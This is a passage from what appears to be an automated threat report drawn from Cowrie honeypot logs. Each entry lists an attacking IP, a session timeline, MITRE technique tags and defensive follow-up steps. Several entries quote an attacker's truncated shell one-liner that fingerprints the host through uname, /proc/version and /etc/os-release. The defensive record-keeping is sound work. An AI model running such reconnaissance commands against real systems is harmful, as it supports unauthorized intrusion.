| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:34:59` | `cowrie.command.failed` |
| `2026-07-13 05:34:59` | `cowrie.command.input` |
| `2026-07-13 05:35:06` | `cowrie.log.closed` |
| `2026-07-13 05:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0203e27a13aa

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:34 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:34:59` | `cowrie.session.connect` |
| `2026-07-13 05:34:59` | `cowrie.login.success` |
| `2026-07-13 05:35:00` | `cowrie.session.params` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:00` | `cowrie.command.failed` |
| `2026-07-13 05:35:00` | `cowrie.command.input` |
| `2026-07-13 05:35:06` | `cowrie.log.closed` |
| `2026-07-13 05:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea571ee3cd3

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:42` | `cowrie.session.connect` |
| `2026-07-13 05:35:42` | `cowrie.login.success` |
| `2026-07-13 05:35:42` | `cowrie.session.params` |
| `2026-07-13 05:35:47` | `cowrie.log.closed` |
| `2026-07-13 05:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd0bcbbd4d5

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:47` | `cowrie.session.connect` |
| `2026-07-13 05:35:47` | `cowrie.login.success` |
| `2026-07-13 05:35:47` | `cowrie.session.params` |
| `2026-07-13 05:35:52` | `cowrie.log.closed` |
| `2026-07-13 05:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1dfb9c48b99

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:47` | `cowrie.session.connect` |
| `2026-07-13 05:35:47` | `cowrie.login.success` |
| `2026-07-13 05:35:48` | `cowrie.session.params` |
| `2026-07-13 05:35:48` | `cowrie.command.input` |
| `2026-07-13 05:35:52` | `cowrie.log.closed` |
| `2026-07-13 05:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d5a5f00521

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:47` | `cowrie.session.connect` |
| `2026-07-13 05:35:48` | `cowrie.login.success` |
| `2026-07-13 05:35:48` | `cowrie.session.params` |
| `2026-07-13 05:35:52` | `cowrie.log.closed` |
| `2026-07-13 05:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a5c87e0468

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:52` | `cowrie.session.connect` |
| `2026-07-13 05:35:52` | `cowrie.login.success` |
| `2026-07-13 05:35:52` | `cowrie.session.params` |
| `2026-07-13 05:35:52` | `cowrie.command.input` |
| `2026-07-13 05:35:57` | `cowrie.log.closed` |
| `2026-07-13 05:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b6bb7f2365

| Field | Detail |
|---|---|
| **Source IP** | `69.164.207[.]173` |
| **First Seen** | 2026-07-13 05:35 |
| **Last Seen** | 2026-07-13 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:35:52` | `cowrie.session.connect` |
| `2026-07-13 05:35:52` | `cowrie.login.success` |
| `2026-07-13 05:35:53` | `cowrie.session.params` |
| `2026-07-13 05:35:53` | `cowrie.command.input` |
| `2026-07-13 05:35:57` | `cowrie.log.closed` |
| `2026-07-13 05:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.164.207[.]173` to AbuseIPDB if not already reported
- [ ] Block `69.164.207[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cf2dfc47ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:37 |
| **Last Seen** | 2026-07-13 05:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:37:16` | `cowrie.session.connect` |
| `2026-07-13 05:37:16` | `cowrie.client.version` |
| `2026-07-13 05:37:16` | `cowrie.client.kex` |
| `2026-07-13 05:37:16` | `cowrie.login.success` |
| `2026-07-13 05:37:17` | `cowrie.session.params` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.success` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:17` | `cowrie.command.input` |
| `2026-07-13 05:37:18` | `cowrie.log.closed` |
| `2026-07-13 05:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07df1fc733e7

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-13 05:37 |
| **Last Seen** | 2026-07-13 05:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:37:48` | `cowrie.session.connect` |
| `2026-07-13 05:37:48` | `cowrie.client.version` |
| `2026-07-13 05:37:48` | `cowrie.client.kex` |
| `2026-07-13 05:37:50` | `cowrie.login.success` |
| `2026-07-13 05:37:50` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fdc71e5709

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-07-13 05:38 |
| **Last Seen** | 2026-07-13 05:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:38:00` | `cowrie.session.connect` |
| `2026-07-13 05:38:01` | `cowrie.client.version` |
| `2026-07-13 05:38:01` | `cowrie.client.kex` |
| `2026-07-13 05:38:02` | `cowrie.login.success` |
| `2026-07-13 05:38:02` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:38:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc34beab0922

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:39 |
| **Last Seen** | 2026-07-13 05:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:39:04` | `cowrie.session.connect` |
| `2026-07-13 05:39:05` | `cowrie.client.version` |
| `2026-07-13 05:39:05` | `cowrie.client.kex` |
| `2026-07-13 05:39:07` | `cowrie.login.success` |
| `2026-07-13 05:39:09` | `cowrie.session.params` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.success` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.command.input` |
| `2026-07-13 05:39:09` | `cowrie.log.closed` |
| `2026-07-13 05:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a654a00c9981

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-07-13 05:40 |
| **Last Seen** | 2026-07-13 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:40:29` | `cowrie.session.connect` |
| `2026-07-13 05:40:29` | `cowrie.client.version` |
| `2026-07-13 05:40:29` | `cowrie.client.kex` |
| `2026-07-13 05:40:29` | `cowrie.login.success` |
| `2026-07-13 05:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0290864745cc

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-13 05:40 |
| **Last Seen** | 2026-07-13 05:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:40:29` | `cowrie.session.connect` |
| `2026-07-13 05:40:29` | `cowrie.client.version` |
| `2026-07-13 05:40:29` | `cowrie.client.kex` |
| `2026-07-13 05:40:29` | `cowrie.login.success` |
| `2026-07-13 05:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50c47dd8c440

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-13 05:40 |
| **Last Seen** | 2026-07-13 05:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:40:36` | `cowrie.session.connect` |
| `2026-07-13 05:40:37` | `cowrie.client.version` |
| `2026-07-13 05:40:37` | `cowrie.client.kex` |
| `2026-07-13 05:40:40` | `cowrie.login.success` |
| `2026-07-13 05:40:41` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7521f9db5d0

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-07-13 05:40 |
| **Last Seen** | 2026-07-13 05:40 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:40:48` | `cowrie.session.connect` |
| `2026-07-13 05:40:50` | `cowrie.client.version` |
| `2026-07-13 05:40:50` | `cowrie.client.kex` |
| `2026-07-13 05:40:52` | `cowrie.login.success` |
| `2026-07-13 05:40:53` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f06aad9500

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:40 |
| **Last Seen** | 2026-07-13 05:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:40:49` | `cowrie.session.connect` |
| `2026-07-13 05:40:50` | `cowrie.client.version` |
| `2026-07-13 05:40:50` | `cowrie.client.kex` |
| `2026-07-13 05:40:52` | `cowrie.login.success` |
| `2026-07-13 05:40:53` | `cowrie.session.params` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.success` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:53` | `cowrie.command.input` |
| `2026-07-13 05:40:54` | `cowrie.log.closed` |
| `2026-07-13 05:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe1d77940f3

| Field | Detail |
|---|---|
| **Source IP** | `89.126.211[.]166` |
| **First Seen** | 2026-07-13 05:42 |
| **Last Seen** | 2026-07-13 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:42:18` | `cowrie.session.connect` |
| `2026-07-13 05:42:19` | `cowrie.telnet.option` |
| `2026-07-13 05:42:19` | `cowrie.telnet.option` |
| `2026-07-13 05:43:19` | `cowrie.login.success` |
| `2026-07-13 05:43:19` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `89.126.211[.]166` to AbuseIPDB if not already reported
- [ ] Block `89.126.211[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5d0b4fb903

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:42 |
| **Last Seen** | 2026-07-13 05:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:42:32` | `cowrie.session.connect` |
| `2026-07-13 05:42:33` | `cowrie.client.version` |
| `2026-07-13 05:42:33` | `cowrie.client.kex` |
| `2026-07-13 05:42:34` | `cowrie.login.success` |
| `2026-07-13 05:42:37` | `cowrie.session.params` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.success` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.command.input` |
| `2026-07-13 05:42:37` | `cowrie.log.closed` |
| `2026-07-13 05:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9150b1071a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:44 |
| **Last Seen** | 2026-07-13 05:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:44:17` | `cowrie.session.connect` |
| `2026-07-13 05:44:17` | `cowrie.client.version` |
| `2026-07-13 05:44:17` | `cowrie.client.kex` |
| `2026-07-13 05:44:19` | `cowrie.login.success` |
| `2026-07-13 05:44:20` | `cowrie.session.params` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.success` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:20` | `cowrie.command.input` |
| `2026-07-13 05:44:21` | `cowrie.log.closed` |
| `2026-07-13 05:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-408964f6d895

| Field | Detail |
|---|---|
| **Source IP** | `191.36.152[.]28` |
| **First Seen** | 2026-07-13 05:44 |
| **Last Seen** | 2026-07-13 05:49 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 05:44:38` | `cowrie.session.connect` |
| `2026-07-13 05:44:39` | `cowrie.client.version` |
| `2026-07-13 05:44:39` | `cowrie.client.kex` |
| `2026-07-13 05:44:41` | `cowrie.login.success` |
| `2026-07-13 05:44:41` | `cowrie.direct-tcpip.request` |
| `2026-07-13 05:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.152[.]28` to AbuseIPDB if not already reported
- [ ] Block `191.36.152[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99abc311231

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 05:46 |
| **Last Seen** | 2026-07-13 05:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
